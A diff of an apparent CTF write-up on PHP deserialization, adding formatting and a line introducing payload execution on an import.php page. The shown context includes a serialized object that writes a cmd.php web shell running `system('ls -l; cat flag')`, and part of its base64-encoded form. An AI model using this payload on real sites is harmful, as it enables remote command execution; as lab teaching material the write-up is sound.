@@ -136,6 +136,7 @@ Let's put all the pieces together to create the payload as a one big serialized 
 
 Take note of the line `s:11:"*filename";s:7:"cmd.php";` which represents our malicious filename with a `.php` extension, and the line `s:7:"*name";s:35:"<?php system('ls -l; cat flag'); ?>";` which represents our PHP `system()` function to execute shell commands.
 
+<br />
 The final serialized payload to be injected as a HTTP POST parameter in base64 format wil follow:
 
 `Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjEyOiJzaGVsbF9seXJpY3MiO3M6`
@@ -164,6 +165,13 @@ We can use the Online PHP Unserializer[^2] to visualize the encoded payload in a
 
 <p align="center">
   <img src="{{ site.url }}/images/unserialize_poc.png" alt="unserialize_poc" />
+</p>
+<p align="center">PHP Class Object representation</p>
+
+And finally, gentlemen, music please — it's time to execute our malicious serialized payload on the `import.php` page!
+
+<p align="center">
+  <img src="{{ site.url }}/images/import_final_payload.png" alt="import_final_payload" />
 </p>
 <p align="center">PHP Class Object representation</p>
 
